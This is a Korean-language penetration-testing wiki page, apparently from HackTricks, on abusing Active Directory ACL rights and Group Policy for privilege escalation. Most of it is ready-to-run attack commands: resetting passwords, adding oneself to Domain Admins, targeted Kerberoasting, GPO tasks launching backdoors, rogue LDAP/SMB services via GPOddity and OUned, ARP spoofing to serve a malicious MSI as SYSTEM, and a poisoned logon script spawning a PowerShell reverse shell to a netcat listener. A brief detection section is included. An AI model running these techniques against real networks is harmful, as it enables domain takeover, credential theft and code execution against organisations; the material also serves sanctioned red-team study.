# Active Directory ACL/ACE 악용

{{#include ../../../banners/hacktricks-training.md}}

**이 페이지는 주로** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **및** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) **의 기법을 요약한 것입니다. 자세한 내용은 원문을 확인하세요.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **User에 대한 GenericAll 권한**

이 권한을 통해 attacker는 대상 user account를 완전히 제어할 수 있습니다. `Get-ObjectAcl` command를 사용하여 `GenericAll` 권한이 확인되면 attacker는 다음을 수행할 수 있습니다.

- **대상 Password 변경**: `net user <username> <password> /domain`을 사용하여 attacker는 user의 password를 재설정할 수 있습니다.
- Linux에서는 Samba `net rpc`를 사용하여 SAMR을 통해 동일한 작업을 수행할 수 있습니다:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **계정이 비활성화된 경우 UAC flag를 지우기**: `GenericAll`을 사용하면 `userAccountControl`을 편집할 수 있습니다. Linux에서 BloodyAD를 사용하여 `ACCOUNTDISABLE` flag를 제거할 수 있습니다:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: 사용자 계정에 SPN을 할당해 kerberoastable 상태로 만든 다음, Rubeus와 targetedKerberoast.py를 사용해 티켓 부여 티켓(TGT) 해시를 추출하고 crack을 시도합니다.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: 사용자의 pre-authentication을 비활성화하여 해당 계정을 ASREPRoasting에 취약하게 만듭니다.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: 사용자에 대한 `GenericAll` 권한이 있으면 certificate-based credential을 추가하고 비밀번호를 변경하지 않고 해당 사용자로 authenticate할 수 있습니다. See:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **그룹에 대한 GenericAll 권한**

이 권한을 사용하면 공격자가 `Domain Admins`와 같은 그룹에 `GenericAll` 권한이 있을 때 그룹 멤버십을 조작할 수 있습니다. `Get-NetGroup`으로 그룹의 distinguished name을 확인한 후 공격자는 다음을 수행할 수 있습니다:

- **자신을 Domain Admins 그룹에 추가**: 직접 명령을 사용하거나 Active Directory 또는 PowerSploit과 같은 모듈을 사용하여 수행할 수 있습니다.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linux에서는 해당 그룹에 대해 GenericAll/Write 멤버십을 보유한 경우 BloodyAD를 활용하여 자신을 임의의 그룹에 추가할 수도 있습니다. 대상 그룹이 “Remote Management Users”에 중첩되어 있다면 해당 그룹을 적용하는 호스트에서 즉시 WinRM 액세스 권한을 얻습니다:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

컴퓨터 object 또는 user account에 이러한 privileges를 보유하면 다음 작업이 가능합니다:

- **Kerberos Resource-based Constrained Delegation**: 컴퓨터 object를 탈취할 수 있습니다.
- **Shadow Credentials**: shadow credentials를 생성할 수 있는 privileges를 악용하여 컴퓨터 또는 user account를 impersonate할 수 있습니다.

## **WriteProperty on Group**

특정 group(예: `Domain Admins`)의 모든 object에 대해 사용자가 `WriteProperty` rights를 보유한 경우 다음 작업이 가능합니다:

- **Add Themselves to the Domain Admins Group**: `net user` 및 `Add-NetGroupUser` commands를 조합하여 수행할 수 있으며, domain 내에서 privilege escalation이 가능합니다.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **그룹에 대한 Self (Self-Membership)**

이 권한을 통해 공격자는 그룹 멤버십을 직접 조작하는 명령을 사용하여 `Domain Admins`와 같은 특정 그룹에 자신을 추가할 수 있습니다. 다음 명령 시퀀스를 사용하면 자신을 추가할 수 있습니다:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

유사한 권한으로, 공격자가 해당 그룹에 `WriteProperty` 권한을 보유한 경우 그룹 속성을 수정하여 직접 자신을 그룹에 추가할 수 있습니다. 이 권한의 확인 및 실행은 다음을 사용하여 수행합니다:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

사용자에 대해 `User-Force-Change-Password`용 `ExtendedRight`를 보유하면 현재 비밀번호를 몰라도 비밀번호를 재설정할 수 있습니다. 이 권한의 확인과 악용은 PowerShell 또는 대체 command-line 도구를 통해 수행할 수 있으며, interactive session과 non-interactive 환경을 위한 one-liner를 포함해 사용자의 비밀번호를 재설정하는 여러 방법을 제공합니다. 명령은 간단한 PowerShell 호출부터 Linux에서 `rpcclient`를 사용하는 방법까지 다양하며, attack vector의 유연성을 보여줍니다.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **그룹에 대한 WriteOwner**

공격자가 그룹에 대해 `WriteOwner` 권한을 가지고 있음을 발견하면 그룹의 소유권을 자신에게 변경할 수 있습니다. 특히 해당 그룹이 `Domain Admins`인 경우, 소유권을 변경하면 그룹 속성과 멤버십을 더 폭넓게 제어할 수 있으므로 영향이 큽니다. 이 과정에는 `Get-ObjectAcl`을 사용해 올바른 object를 식별한 다음, SID 또는 이름을 사용해 `Set-DomainObjectOwner`로 소유자를 변경하는 작업이 포함됩니다.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

이 권한을 사용하면 공격자가 사용자 속성을 수정할 수 있습니다. 구체적으로 `GenericWrite` 액세스 권한이 있으면 공격자는 사용자가 로그온할 때 악성 스크립트를 실행하도록 사용자의 로그온 스크립트 경로를 변경할 수 있습니다. 이는 `Set-ADObject` 명령을 사용하여 대상 사용자의 `scriptpath` 속성이 공격자의 스크립트를 가리키도록 업데이트하는 방식으로 수행됩니다.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

이 권한을 사용하면 공격자는 그룹 멤버십을 조작하여 자신이나 다른 사용자를 특정 그룹에 추가할 수 있습니다. 이 과정에는 credential object를 생성하고, 이를 사용하여 그룹에서 사용자를 추가하거나 제거한 다음, PowerShell 명령으로 멤버십 변경 사항을 확인하는 작업이 포함됩니다.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Linux에서 Samba `net`은 그룹에 대한 `GenericWrite` 권한을 보유한 경우 멤버를 추가하거나 제거할 수 있습니다(PowerShell/RSAT를 사용할 수 없을 때 유용):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

AD 객체를 소유하고 해당 객체에 `WriteDACL` 권한이 있으면 공격자는 객체에 대한 `GenericAll` 권한을 자신에게 부여할 수 있습니다. 이는 ADSI 조작을 통해 수행되며, 객체를 완전히 제어하고 해당 객체의 그룹 멤버십을 수정할 수 있습니다. 그러나 Active Directory 모듈의 `Set-Acl` / `Get-Acl` cmdlet을 사용하여 이러한 권한을 악용하려고 할 때는 제한 사항이 존재합니다.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner 빠른 takeover (PowerView)

사용자 또는 service account에 대해 `WriteOwner` 및 `WriteDacl` 권한이 있으면 이전 password를 몰라도 PowerView를 사용해 해당 계정을 완전히 제어하고 password를 reset할 수 있습니다:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
참고:
- `WriteOwner` 권한만 있는 경우 먼저 소유자를 자신으로 변경해야 할 수 있습니다:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- 비밀번호 재설정 후 모든 프로토콜(SMB/LDAP/RDP/WinRM)을 사용하여 access를 검증합니다.

## **도메인에서의 Replication (DCSync)**

DCSync attack은 도메인의 특정 replication permissions를 활용하여 Domain Controller를 모방하고 사용자 credentials를 포함한 데이터를 synchronize합니다. 이 강력한 technique을 사용하려면 `DS-Replication-Get-Changes`와 같은 permissions가 필요하며, 이를 통해 attackers는 Domain Controller에 직접 access하지 않고도 AD environment에서 민감한 정보를 extract할 수 있습니다.<sup>[[5]](#references)</sup> [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects (GPOs)를 manage할 수 있도록 delegated access가 부여되면 심각한 security risks가 발생할 수 있습니다. 예를 들어 `offense\spotless`와 같은 user에게 GPO management rights가 delegated된 경우 **WriteProperty**, **WriteDacl**, **WriteOwner**와 같은 privileges를 가질 수 있습니다. 이러한 permissions는 malicious purposes로 abuse될 수 있으며, PowerView를 사용하여 다음과 같이 식별할 수 있습니다: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO Permissions 열거

Misconfigured GPOs를 identify하려면 PowerSploit의 cmdlets를 서로 chain할 수 있습니다. 이를 통해 특정 user가 manage할 permissions를 가진 GPOs를 discover할 수 있습니다: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**특정 Policy가 적용된 Computers**: 특정 GPO가 어떤 computers에 적용되는지 resolve하여 potential impact의 scope를 파악할 수 있습니다. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**특정 Computer에 적용된 Policies**: 특정 computer에 어떤 policies가 적용되는지 확인하려면 `Get-DomainGPO`와 같은 commands를 사용할 수 있습니다.

**특정 Policy가 적용된 OUs**: 특정 policy의 영향을 받는 organizational units (OUs)는 `Get-DomainOU`를 사용하여 identify할 수 있습니다.

[**GPOHound**](https://github.com/cogiceo/GPOHound) tool을 사용하여 GPOs를 enumerate하고 해당 GPOs의 issues를 찾을 수도 있습니다.

### Abuse GPO - New-GPOImmediateTask

Misconfigured GPOs는 code를 execute하도록 exploit할 수 있으며, 예를 들어 immediate scheduled task를 생성할 수 있습니다. 이를 통해 영향을 받는 machines의 local administrators group에 user를 추가하여 privileges를 크게 elevate할 수 있습니다:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module이 설치되어 있으면 새로운 GPO를 생성하고 연결할 수 있으며, 영향을 받는 컴퓨터에서 backdoor를 실행하도록 registry 값과 같은 preference를 설정할 수 있습니다. 이 방법을 사용하려면 GPO가 업데이트되고 사용자가 해당 컴퓨터에 로그인하여 실행이 이루어져야 합니다:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPO 악용

SharpGPOAbuse는 새 GPO를 생성할 필요 없이 task를 추가하거나 설정을 수정하여 기존 GPO를 악용하는 방법을 제공합니다. 이 tool을 사용하려면 변경 사항을 적용하기 전에 기존 GPO를 수정하거나 RSAT tools를 사용하여 새 GPO를 생성해야 합니다:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### 정책 강제 업데이트

GPO 업데이트는 일반적으로 약 90분마다 수행됩니다. 특히 변경 사항을 적용한 직후 이 프로세스를 앞당기려면 대상 컴퓨터에서 `gpupdate /force` 명령을 사용하여 즉시 정책 업데이트를 강제할 수 있습니다. 이 명령을 사용하면 다음 자동 업데이트 주기를 기다리지 않고 GPO에 대한 수정 사항이 적용됩니다.

### 내부 동작

`Misconfigured Policy`와 같은 특정 GPO의 Scheduled Tasks를 검사하면 `evilTask`와 같은 task가 추가된 것을 확인할 수 있습니다. 이러한 task는 시스템 동작을 수정하거나 권한을 상승시키기 위해 script 또는 command-line tool을 통해 생성됩니다.

`New-GPOImmediateTask`가 생성한 XML configuration file에 표시된 task 구조에는 실행할 command와 trigger를 비롯한 Scheduled Task의 세부 정보가 포함됩니다. 이 file은 Scheduled Task가 GPO 내에서 정의되고 관리되는 방식을 나타내며, policy enforcement의 일부로 임의의 command 또는 script를 실행하는 방법을 제공합니다.

### 사용자 및 그룹

GPO를 사용하면 대상 시스템의 사용자 및 그룹 멤버십도 조작할 수 있습니다. Users and Groups policy file을 직접 편집하면 공격자가 사용자를 로컬 `administrators` 그룹과 같은 privileged group에 추가할 수 있습니다. 이는 GPO management permission의 위임을 통해 가능하며, 이 권한으로 policy file을 수정하여 새 사용자를 포함하거나 group membership을 변경할 수 있습니다.

Users and Groups의 XML configuration file에는 이러한 변경 사항이 구현되는 방식이 정의되어 있습니다. 이 file에 entry를 추가하면 영향을 받는 시스템 전반에서 특정 사용자에게 elevated privilege를 부여할 수 있습니다. 이 방법은 GPO manipulation을 통한 privilege escalation에 직접적인 접근 방식을 제공합니다.

또한 logon/logoff script 활용, autorun을 위한 registry key 수정, .msi file을 통한 software 설치 또는 service configuration 편집과 같이 code를 실행하거나 persistence를 유지하는 추가 방법도 고려할 수 있습니다. 이러한 technique은 GPO abuse를 통해 access를 유지하고 대상 시스템을 제어할 수 있는 다양한 경로를 제공합니다.

### 인증된 rogue service로 GPC/GPT retrieval 리디렉션

GPO는 metadata가 포함된 LDAP **Group Policy Container (GPC)**와 policy file이 저장된 SMB-hosted **Group Policy Template (GPT)**로 구성됩니다. refresh 중에 client는 container의 `gPLink`를 따르고, 참조된 GPC와 해당 GPC의 `gPCFileSysPath`를 읽은 다음 해당 UNC path에서 GPT를 download합니다. 따라서 GPC 자체 또는 OU, Site나 Domain의 `gPLink`에 대한 write access를 privileged policy processing으로 전환할 수 있습니다.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### GPOddity를 사용한 `gPCFileSysPath` poisoning

controlled principal이 대상 GPC에 write할 수 있다면(직접 또는 **NTLM relay to LDAP**를 통해), `gPCFileSysPath`를 공격자가 호스팅하는 UNC path로 교체합니다. [GPOddity](https://github.com/synacktiv/GPOddity)는 LDAP 변경을 자동화하고, module-based policy file 또는 Group Policy client가 `NT AUTHORITY\SYSTEM`으로 실행하는 Immediate Task가 포함된 malicious GPT를 제공합니다.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

현재 Windows client에서는 anonymous 또는 credential-agnostic SMB share만으로는 충분하지 않습니다. SMB Secure Negotiate는 authentication이 성공했다는 증명을 요구하므로 rogue service는 domain identity를 검증하고, SMB session key를 도출하며, response에 올바르게 sign해야 합니다. embedded mode에서는 controlled machine account와 해당 service key로 GPOddity를 configure한 다음 `[COMMANDS]` section에서 computer-side 또는 user-side payload를 선택합니다.<sup>[[15]](#references)[[16]](#references)</sup>
```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```
**User GPO edge case:** MS16-072 이후에도 Windows는 **동일한 TCP connection**에서 두 개의 SMB2 session을 생성합니다. 즉, user session은 `GPT.INI`를 읽고, 이후 computer-account session은 `ScheduledTasks.xml`과 같은 유효 configuration을 읽습니다. 따라서 rogue server는 authentication state, session keys 및 signing keys를 socket만이 아니라 SMB2 `SessionId`별로 인덱싱해야 합니다. GPOddity/OUned에 포함된 Scapy fork는 `SMBStreamSocketMultiplexing` 및 multiplexing-aware `SMBServer`를 통해 이를 구현합니다. 반면 single-session Impacket/Scapy server는 그렇지 않으면 잘못된 signing state를 재사용하여 user policies에서 실패합니다.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning with OUned

`WriteGPLink`, `GenericWrite` 또는 이와 동등한 권한으로 OU, Site 또는 Domain을 제어할 수 있는 경우, attacker는 GPC DN이 attacker-controlled LDAP host에서 제공되는 link를 추가할 수 있습니다. 이 primitive는 원래 Petros Koutroumpis가 소개했으며, [OUned](https://github.com/synacktiv/OUned)는 LDAP write와 malicious GPC/GPT chain을 자동화합니다.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```
피해자는 먼저 rogue LDAP 서비스에 인증하고 `gPCFileSysPath`가 rogue SMB 서비스를 가리키는 GPC를 받습니다. 그런 다음 SMB에 인증하고 제공된 GPT를 적용합니다. 따라서 OUned에는 LDAP SPN이 있는 계정, SMB용 HOST SPN이 있는 machine account(동일한 machine account로 두 조건을 모두 충족할 수 있음), 그리고 포트 389와 445를 operator 호스트로 전달하는 DNS resolution 또는 reverse forwarding이 필요합니다.<sup>[[15]](#references)[[17]](#references)</sup>
```bash
python3 OUned.py --config config.ini -v
```
OUned의 내장 Scapy LDAP server는 실제로 제어 중인 service key로 Kerberos/SPNEGO를 검증하고 JSON에서 임의의 GPC 데이터를 제공합니다. 빈 JSON key는 rootDSE를 모델링하며, `base64:` 접두사는 바이너리 값을 나타냅니다. 또한 이 server는 add/delete/modify/search와 `BASE`, `LEVEL`, `SUBTREE` searches를 지원하며, 보호 없음, 무결성 또는 기밀성으로 협상할 수 있습니다. 따라서 다른 Windows component가 attacker-controlled LDAP reference를 따르면서도 authenticated LDAP를 요구하는 경우 이 service를 재사용할 수 있습니다.<sup>[[15]](#references)</sup>

계정 password를 dummy domain으로 동기화한다고 해서 모든 Kerberos key가 재현된다고 가정해서는 안 됩니다. RC4는 password에서 파생되지만, AES string-to-key는 principal의 hostname/domain에서 파생된 salt도 사용합니다. 실제 계정 AES key를 `KerberosSSP`에 제공하면 machine account의 자체 수정 가능한 `msDS-SupportedEncryptionTypes`를 탐지 가능한 변경으로 수정하여 RC4를 강제할 필요가 없습니다.<sup>[[15]](#references)</sup>

#### Detection pivots

`gPCFileSysPath` 또는 `gPLink` 변경 사항을 GPO version 변경 및 새로운 Immediate/Scheduled Task XML과 상호 연관 분석합니다. 예상하지 못한 naming context로 연결되는 링크, 승인된 DC/SYSVOL set 외부의 UNC host, machine-account name을 redirect하는 DNS records, 비정상적인 machine account에 대한 LDAP/CIFS service tickets, RC4를 활성화하는 `msDS-SupportedEncryptionTypes` 변경을 조사합니다.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

OU/domain에 대한 `WriteGPLink`를 사용하면 대상 container의 `gPLink` attribute를 수정하고 GPO 자체를 편집하지 않고도 **기존 GPO가 적용되도록 강제**할 수 있습니다. 연결된 GPO가 이미 **UNC paths**(`\\HOST\share\...`)를 통해 remote content를 참조하는 경우 이는 중요해집니다. authenticated users는 **SYSVOL**을 읽고 재사용 가능한 policies를 offline에서 탐색할 수 있기 때문입니다.<sup>[[11]](#references)</sup>

High-level workflow:

1. BloodHound를 사용하여 OU에 대한 `WriteGPLink`를 가진 principal을 식별하고 해당 OU 내부의 computers/users를 열거합니다.
2. `SYSVOL`을 read-only로 clone하고 GPOs를 분석하여 UNC paths를 참조하는 **Software Installation**, **drive mappings**(`Drives.xml`), **logon/startup scripts**를 찾습니다.
3. DFS/domain-namespace paths 대신 **direct hostname**을 가리키는 policies(예: `\\DC02\share\pkg.msi`)를 우선합니다. hostname-based paths가 L2 spoofing으로 redirect하기 더 쉽기 때문입니다.
4. 선택한 GPO GUID를 대상 OU의 `gPLink`에 추가하여 victim이 이미 존재하는 해당 policy를 처리하도록 합니다.
5. 동일한 broadcast domain에서 UNC host를 ARP spoof하고 해당 IP를 로컬에 bind합니다(`ip addr add <target_ip>/32 dev <iface>`). 이렇게 하면 victim의 SMB traffic이 사용자의 host에 도달합니다.
6. attacker SMB server(예: `smbserver.py`)에서 예상되는 path/filename을 제공하고 정상적인 policy processing을 기다립니다.

`SYSVOL` collection 및 GPO correlation 예제:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
기존 GPO를 대상 OU에 연결:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

연결된 GPO가 UNC 경로에서 MSI를 배포하면, client는 **computer startup** 중 이를 가져와 **`NT AUTHORITY\SYSTEM`** 권한으로 설치합니다. 참조된 host를 spoofing하고 **동일한 share/path/name**으로 malicious MSI를 제공하면, **SYSVOL을 수정하지 않고도** `WriteGPLink`를 SYSTEM code execution으로 전환할 수 있습니다.

Important constraints:

- **Timing matters**: 새 link는 policy refresh 시점(일반적으로 약 90분)에 반영되지만, **Software Installation**은 보통 **reboot** 시 실행됩니다.
- Windows Installer는 일반적으로 package **`ProductCode`**를 사용해 deployment를 추적합니다. product가 이미 설치되어 있으면 deployment가 skip될 수 있습니다.
- installer rejection을 방지하려면 rogue MSI를 patch하여 **`ProductCode`**와 **`PackageCode`**가 GPO에서 요구하는 legitimate package와 일치하도록 해야 합니다.
- 이전 `.aas` advertisement files가 `SYSVOL`에 남아 있을 수 있으므로, 이를 이용하기 전에 deployment가 여전히 active 상태로 보이는지 validate해야 합니다.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings in `Drives.xml`은 logon 또는 reconnection 중 사용자가 구성된 UNC 경로에 authenticate하도록 합니다. 참조된 host를 spoof하면 **NetNTLMv2**를 capture할 수 있습니다. SMB를 의도적으로 fail하게 만들면 Windows가 **WebDAV**를 통해 retry하면서 **NTLM over HTTP**를 전송할 수 있으며, 이는 **LDAP(S)**, **AD CS** 또는 **SMB**로 relay하기에 훨씬 유연합니다.

#### Logon/startup script UNC hijack

동일한 패턴이 `SYSVOL`에서 발견되는 UNC-hosted scripts에도 적용됩니다.

- **Logon scripts**는 일반적으로 **user** context에서 실행됩니다.
- **Startup scripts**는 일반적으로 **computer / SYSTEM** context에서 실행됩니다.

script path가 spoof 가능한 hostname을 가리키는 경우 UNC host를 redirect하고 예상된 location에서 replacement script content를 serve합니다.

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` 또는 `\\<dc>\NETLOGON\` 아래의 writable paths를 사용하면 GPO를 통해 user logon 시 실행되는 logon scripts를 tamper할 수 있습니다. 이를 통해 logging users의 security context에서 code execution이 가능합니다.

### Locate logon scripts
- 구성된 logon script를 확인하려면 user attributes를 inspect합니다:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- 바로 가기 또는 스크립트에 대한 참조를 찾기 위해 도메인 공유를 크롤링합니다:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- `.lnk` 파일을 구문 분석하여 SYSVOL/NETLOGON을 가리키는 대상 확인 (유용한 DFIR 기법이며 직접 GPO 액세스 권한이 없는 공격자에게도 유용):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound는 존재하는 경우 사용자 노드에 `logonScript` (`scriptPath`) attribute를 표시합니다.

### write access 검증 (share listing을 신뢰하지 말 것)
Automated tooling에서는 SYSVOL/NETLOGON이 read-only로 표시될 수 있지만, underlying NTFS ACL은 여전히 write를 허용할 수 있습니다. 항상 테스트하세요:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
파일 크기 또는 mtime이 변경되면 write 권한이 있는 것입니다. 수정하기 전에 원본을 보존하세요.

### RCE를 위해 VBScript logon script를 Poison하기
PowerShell reverse shell을 실행하는 명령을 추가하고(문자열은 revshells.com에서 생성), 비즈니스 기능이 중단되지 않도록 원래 로직을 유지하세요:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
호스트에서 수신 대기하고 다음 interactive logon을 기다립니다:
```bash
rlwrap -cAr nc -lnvp 443
```
참고:
- 실행은 logging user의 token(SYSTEM 아님)으로 수행됩니다. 범위는 해당 script를 적용하는 GPO link(OU, site, domain)입니다.
- 사용 후 원래 content/timestamps를 복원하여 정리합니다.


## References

- [1] [Active Directory ACL/ACE 악용](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privileged Accounts 및 Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – ACL Attack Path 업데이트](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Active Directory의 ACL을 사용한 Privilege Escalation](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Active Directory Privileges 및 Privileged Accounts 스캔](https://adsecurity.org/?p=3658)
